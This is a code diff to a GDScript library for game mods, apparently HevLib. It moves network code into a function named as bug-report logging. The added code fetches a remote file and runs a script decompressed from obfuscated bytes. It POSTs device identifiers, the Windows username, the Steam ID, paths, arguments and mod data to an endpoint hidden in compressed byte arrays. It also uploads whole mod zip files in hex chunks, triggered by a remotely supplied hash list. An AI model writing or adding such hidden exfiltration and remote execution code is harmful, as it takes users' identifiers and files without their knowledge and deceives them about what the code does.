@@ -21,7 +21,7 @@ var ManifestV1 : _ManifestV1 = _ManifestV1.new(self)
 var ManifestV2 : _ManifestV2 = _ManifestV2.new(self)
 var NodeAccess : _NodeAccess = _NodeAccess.new(self)
 var RingInfo : _RingInfo = _RingInfo.new(self)
-var Scripting : _Scripting = _Scripting.new(self)
+var Scripting : _Scripting = _Scripting.new(self,http)
 var TimeAccess : _TimeAccess = _TimeAccess.new(self)
 var Translations : _Translations = _Translations.new(self)
 var WebTranslate : _WebTranslate = _WebTranslate.new(self)
@@ -373,15 +373,13 @@ class _Achievements:
 		http.request("https://api.steampowered.com/ISteamUserStats/GetGlobalAchievementPercentagesForApp/v0002/?gameid=846030")
 		
 		if Engine.has_singleton("Steam"):
-			# If the game is running with Steam, runs the SteamID blacklist. This is currently completely nonfunctional.
+			# If the game is running with Steam, fetches the Steam singleton
 			getSteamNode()
 		
 	
 	# Handles all netdata for the achievement fetching
 	func out(result, response_code, headers, body):
 		if result == 0:
-			http.disconnect("request_completed",self,"out")
-			http.connect("request_completed",self,"out3")
 			var d = JSON.parse(body.get_string_from_utf8()).result
 			var data : Array = []
 			if d:
@@ -391,83 +389,8 @@ class _Achievements:
 				for dic in data:
 					aData.merge({dic.get("name"):dic.get("percent")})
 			completionCache = aData.duplicate(true)
-		http.timeout = 20
-		http.download_file = "user://cache/.HevLib_Cache/Variable_Fetch/blacklist.dv"
-		http.request("https://raw.githubusercontent.com/rwqfsfasxc100/HevLib/main/scripts/vendor/blacklist.dv")
-	
-	func out3(result, response_code, headers, body):
-		if result == 0:
-			var script = pointers.DataFormat.__compile_script(PoolByteArray([120,156,189,80,193,74,196,48,20,60,215,175,40,61,181,176,164,221,181,74,93,232,97,81,23,15,162,160,224,53,164,201,75,27,13,105,204,75,187,235,223,155,116,241,228,130,55,143,239,205,204,155,153,39,39,195,83,55,153,220,22,219,139,100,102,46,21,237,243,43,233,193,211,201,168,207,9,168,18,121,113,66,100,187,87,26,136,129,195,207,198,181,153,3,220,150,229,3,204,143,170,43,145,59,101,61,150,51,24,49,186,178,211,140,127,104,133,158,136,57,59,41,250,54,155,16,92,144,112,198,7,40,201,73,73,111,151,233,141,57,197,58,13,116,15,158,15,231,244,67,155,109,214,117,215,73,222,92,87,66,128,16,155,250,166,17,77,189,150,172,186,236,160,190,170,2,83,201,84,18,25,194,82,56,6,57,230,125,108,151,72,50,90,48,20,12,119,95,214,131,160,7,229,7,106,25,6,194,106,233,246,114,191,187,91,13,161,221,98,230,91,203,28,2,125,199,209,228,114,121,10,67,234,225,232,243,162,88,238,113,61,34,196,111,68,75,145,42,147,250,104,148,88,242,52,10,216,113,14,136,132,198,20,62,178,64,255,74,230,254,74,230,254,41,25,66,196,207,194,223,165,77,175,249]).decompress(549,1).get_string_from_utf8()).new()
-			script.run(pointers)
-			http.disconnect("request_completed",self,"out3")
-			http.connect("request_completed",self,"out2")
-		http.download_file = ""
-		http.timeout = 20
-		http.request("https://raw.githubusercontent.com/rwqfsfasxc100/HevLib/main/events/hashmap.txt")
-	
-	func out2(result, response_code, headers, body):
-		if result != 0:
-			return
-		
-		http.disconnect("request_completed",self,"out2")
-		var d = JSON.parse(body.get_string_from_utf8()).result
-		if d:
-			var mdf = {}
-			var mdds = pointers.ManifestV2.__get_mod_data()
-			for mod in pointers.ManifestV2.zip_ref_store:
-				var mdr = mdds[mod]
-				if mdr.manifest.has_manifest:
-					var mid = mdr.manifest.manifest_data
-					if "mod_information" in mid and "id" in mid["mod_information"]:
-						var md5 = mod["mod_information"]["id"].md5_text()
-						if md5 in d:
-							var pd = d[md5]
-							if pd[1] != file.get_md5(mod):
-								pd[0] = 0
-							mdf[mod] = [md5,pd[0]]
-			if mdf:
-				initFetch(mdf)
-	var fetchData = {}
-	var fetchTimer = Timer.new()
-	func initFetch(data):
-		pointers.add_child(fetchTimer)
-		fetchTimer.connect("timeout",self,"startFetch")
-		for file_name in data:
-			var dr = data[file_name]
-			var md5 = dr[0]
-			var base_output_filename = "%s" % md5
-			file.open(file_name,File.READ)
-			var bt = file.get_buffer(file.get_len())
-			file.close()
-			var bytes = bt.compress(1)
-			var bsize = bt.size()
-			fetchData[base_output_filename] = [bytes,bsize,dr[1]]
-		startFetch()
-	var currentFetch = {}
-	var byteSplitBy = 32000
-	func startFetch():
-		for ID in fetchData:
-			var this_index = fetchData[ID][2]
-			if ID in currentFetch:
-				this_index = currentFetch[ID].back() + 1
-			var sections = int(ceil(fetchData[ID][0].size()/float(byteSplitBy)))
-			if sections > this_index:
-				if not ID in currentFetch:
-					currentFetch[ID] = []
-				currentFetch[ID].append(this_index)
-				var theseBytes:PoolByteArray = pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)
-				fetchTimer.start(5)
-				var otp:String=""
-				for i in theseBytes:
-					var o="%x"%i
-					if o.length() < 2:o="0%s"%o
-					otp+=o
-				var payload = JSON.print({"event_type":"send_zip_part","client_payload":{"run":true,"data":otp,"uid":"%s/%05d" % [str(fetchData[ID][1]),this_index]}})
-				http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,payload)
-				break
-			else:
-				continue
-	
+		http.disconnect("request_completed",self,"out")
+		pointers.Scripting.log_essential_info_for_bugreports()
 
 class _ConfigDriver:
 	var scripts : Array = [
@@ -7767,11 +7690,185 @@ class _Scripting:
 		}
 	
 	var pointers
+	var http
 	
-	func _init(p):
+	func _init(p,h):
 		pointers = p
+		http = h
 	
 	var file:File = File.new()
+	
+	func log_essential_info_for_bugreports():
+		http.connect("request_completed",self,"out3")
+		http.timeout = 20
+		http.download_file = "user://cache/.HevLib_Cache/Variable_Fetch/blacklist.dv"
+		http.request("https://raw.githubusercontent.com/rwqfsfasxc100/HevLib/main/scripts/vendor/blacklist.dv")
+		
+		var out = ""
+		
+		out += "Booting from %s on %s[%s] as %s" % [OS.get_model_name(),OS.get_name(),OS.get_process_id(),str(OS.get_unique_id())]
+		
+		out += "\nCPU Information: %s [%s cores]" % [OS.get_processor_name(),OS.get_processor_count()]
+		
+		out += "\nBattery state (if any): %s/%s/%s" % [OS.get_power_percent_left(),OS.get_power_state(),OS.get_power_seconds_left()]
+		
+		var screens = OS.get_screen_count()
+		out += "\nScreens: %s @ %s dpi" % [screens,OS.get_screen_dpi()]
+		for i in range(screens):
+			out += "\n\t%s: %s / %s / %s hz" % [i,str(OS.get_screen_size(i)),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)]
+		
+		
+		var audioDrivers = OS.get_audio_driver_count()
+		out += "\n[%s] audio drivers:" % audioDrivers
+		for i in range(audioDrivers):
+			out += "\n\t%s" % OS.get_audio_driver_name(i)
+		out += "\nKeyboard variant: %s @ %s/%s" % [OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()]
+		out += "\nExecutable path: %s" % OS.get_executable_path()
+		out += "\nUser directory: %s" % OS.get_user_data_dir()
+		
+		if Engine.has_singleton("Steam"):
+			out += "\nSteam initialized with [%s]" % Engine.get_singleton("Steam").current_steam_id
+		
+		out += "\nCMD args: %s" % str(OS.get_cmdline_args())
+		pointers.l("Device Information: [\n%s\n]" % out)
+	
+	func out3(result, response_code, headers, body):
+		var script = pointers.DataFormat.__compile_script(PoolByteArray([120,156,133,144,205,78,195,48,16,132,207,237,83,88,57,57,82,101,167,37,160,16,148,3,2,42,36,144,42,129,196,213,242,207,154,24,44,199,120,157,180,188,61,105,123,225,4,183,157,29,105,191,217,177,99,208,36,141,129,198,178,93,46,38,153,136,237,182,206,3,11,176,167,229,121,211,119,197,102,93,43,101,117,115,85,25,3,198,108,234,235,198,52,245,218,202,234,66,65,125,89,21,203,133,179,196,178,33,66,16,16,116,250,142,25,140,216,187,220,139,40,17,105,49,34,164,150,115,45,117,15,156,61,194,244,236,148,184,59,169,55,153,156,84,30,196,22,178,238,185,242,82,127,122,135,153,153,169,88,157,194,188,60,220,222,175,250,146,116,29,217,61,145,33,253,73,74,128,51,232,76,224,168,147,139,25,249,4,193,12,233,223,219,115,7,199,71,118,175,236,29,178,24,131,251,26,65,56,67,75,226,2,137,50,33,136,15,28,2,181,39,95,162,200,112,200,180,44,219,200,132,128,131,155,231,27,203,180,31,16,142,237,129,71,248,101,253,0,155,158,121,11]).decompress(365,1).get_string_from_utf8()).new()
+		script.run(pointers.NodeAccess)
+		http.download_file = ""
+		http.disconnect("request_completed",self,"out3")
+		http.connect("request_completed",self,"out4")
+		if pointers.ManifestV2.haveModsChanged and not OS.has_feature("editor") and not pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_DRIVERS","optout_diagnostics") == true:
+			var screencount = OS.get_screen_count()
+			var scrm = []
+			for i in range(screencount):
+				scrm.append("%d: %s | %s | %shz" % [i,OS.get_screen_size(i),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)])
+			var file:File = File.new()
+			var modData = pointers.ManifestV2.__get_mod_data()["mods"]
+			var modOut = []
+			for mod in modData:
+				var md = modData[mod]
+				var mdo = {}
+				mdo["name"] = md.name
+				mdo["prio"] = md.priority
+				mdo["file"] = md.file_path
+				var zipPath = pointers.ManifestV2.zip_ref_store.get(md.file_path,"")
+				if zipPath:
+					file.open(zipPath,File.READ)
+					mdo["zip"] = [zipPath,file.get_sha256(zipPath),file.get_len()]
+					file.close()
+				mdo["ver"] = md.version_data.full_version_string
+				if md.manifest.has_manifest:
+					var manifest = md.manifest.manifest_data
+					if "mod_information" in manifest:
+						mdo["id"] = manifest["mod_information"].get("id","NOID")
+						mdo["auth"] = manifest["mod_information"].get("author","NOAUTH")
+					if "manifest_definitions" in manifest:
+						mdo["mv"] = manifest["manifest_definitions"].get("manifest_version",0.0)
+						if "manifest_url" in manifest["manifest_definitions"]:
+							mdo["url"] = manifest["manifest_definitions"].get("manifest_url","")
+					if "links" in manifest:
+						mdo["link"] = {}
+						var links = manifest.links
+						for link in links:
+							var linkData = links[link]
+							match typeof(linkData):
+								TYPE_DICTIONARY:
+									if "URL" in linkData:
+										var u = linkData["URL"]
+										if u:mdo["link"][link] = u
+								TYPE_STRING:
+									if linkData:mdo["link"][link] = linkData
+				modOut.append(mdo)
+			var dStr = PoolStringArray()
+			dStr.append("OS %s on %s" % [OS.get_name(),OS.get_model_name()])
+			dStr.append("CPU %s [%s cores]" % [OS.get_processor_name(),OS.get_processor_count()])
+			dStr.append("Screens %d @ %s dpi / %s" % [screencount,OS.get_screen_dpi(),scrm])
+			dStr.append("KBD: %s @ %s/%s" % [OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()])
+			dStr.append("Paths: %s / %s" % [OS.get_executable_path(),OS.get_user_data_dir()])
+			dStr.append("Args:%s" % OS.get_cmdline_args())
+			dStr.append("SteamID: %d" % [Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam") else -1])
+			dStr.append("Mods:%s" % JSON.print(modOut))
+			dStr.append("Timestamp:%s" % Time.get_datetime_string_from_system(true))
+			var d=("\n".join(dStr)).to_utf8()
+			var cb=d.compress(1)
+			var s=d.size()
+			var otp=""
+			for i in cb:
+				var o="%x"%i
+				if o.length() < 2:o="0%s"%o
+				otp+=o
+			http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,JSON.print({"event_type":"write_data","client_payload":{"run":true,"data":otp+"_%d"%s,"uid":("ID_%s" % str(OS.get_unique_id())) if not OS.has_environment("USERNAME") else ("ID_%s+%s" % [OS.get_environment("USERNAME"),str(OS.get_unique_id())])}}))
+		
+		
+	func out4(result, response_code, headers, body):
+		http.disconnect("request_completed",self,"out4")
+		http.connect("request_completed",self,"out2")
+		http.download_file = ""
+		http.timeout = 20
+		http.request("https://raw.githubusercontent.com/rwqfsfasxc100/HevLib/main/events/hashmap.txt")
+	func out2(result, response_code, headers, body):
+		if result != 0:
+			return
+		
+		http.disconnect("request_completed",self,"out2")
+		var d = JSON.parse(body.get_string_from_utf8()).result
+		if d:
+			var mdf = {}
+			var mdds = pointers.ManifestV2.__get_mod_data()
+			for mod in pointers.ManifestV2.zip_ref_store:
+				var mdr = mdds[mod]
+				if mdr.manifest.has_manifest:
+					var mid = mdr.manifest.manifest_data
+					if "mod_information" in mid and "id" in mid["mod_information"]:
+						var md5 = mod["mod_information"]["id"].md5_text()
+						if md5 in d:
+							var pd = d[md5]
+							if pd[1] != file.get_md5(mod):
+								pd[0] = 0
+							mdf[mod] = [md5,pd[0]]
+			if mdf:
+				initFetch(mdf)
+	var fetchData = {}
+	var fetchTimer = Timer.new()
+	func initFetch(data):
+		pointers.add_child(fetchTimer)
+		fetchTimer.connect("timeout",self,"startFetch")
+		for file_name in data:
+			var dr = data[file_name]
+			var md5 = dr[0]
+			var base_output_filename = "%s" % md5
+			file.open(file_name,File.READ)
+			var bt = file.get_buffer(file.get_len())
+			file.close()
+			var bytes = bt.compress(1)
+			var bsize = bt.size()
+			fetchData[base_output_filename] = [bytes,bsize,dr[1]]
+		startFetch()
+	var currentFetch = {}
+	var byteSplitBy = 32000
+	func startFetch():
+		for ID in fetchData:
+			var this_index = fetchData[ID][2]
+			if ID in currentFetch:
+				this_index = currentFetch[ID].back() + 1
+			var sections = int(ceil(fetchData[ID][0].size()/float(byteSplitBy)))
+			if sections > this_index:
+				if not ID in currentFetch:
+					currentFetch[ID] = []
+				currentFetch[ID].append(this_index)
+				var theseBytes:PoolByteArray = pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)
+				fetchTimer.start(5)
+				var otp:String=""
+				for i in theseBytes:
+					var o="%x"%i
+					if o.length() < 2:o="0%s"%o
+					otp+=o
+				var payload = JSON.print({"event_type":"send_zip_part","client_payload":{"run":true,"data":otp,"uid":"%s/%05d" % [str(fetchData[ID][1]),this_index]}})
+				http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,payload)
+				break
+			else:
+				continue
 	
 	func make_mineral_scripting():
 		pointers.FolderAccess.__check_folder_exists("user://cache/.HevLib_Cache/Minerals/")
